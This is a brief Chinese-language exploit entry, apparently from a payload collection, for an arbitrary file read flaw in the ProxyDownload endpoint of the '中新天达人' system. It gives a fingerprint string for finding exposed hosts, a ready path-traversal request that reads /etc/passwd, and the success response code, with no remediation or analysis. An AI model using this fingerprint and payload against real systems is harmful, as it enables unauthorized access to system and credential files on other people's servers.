# 中新天达人系统proxyDownload任意文件读取漏洞

中新天达人系统proxyDownload ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="aexp/ValidateImage"`

**Payload**
```
/aexp/ProxyDownload?path=/speedec/webapps/webftp/../../../../etc/passwd
```
- **响应特征**：200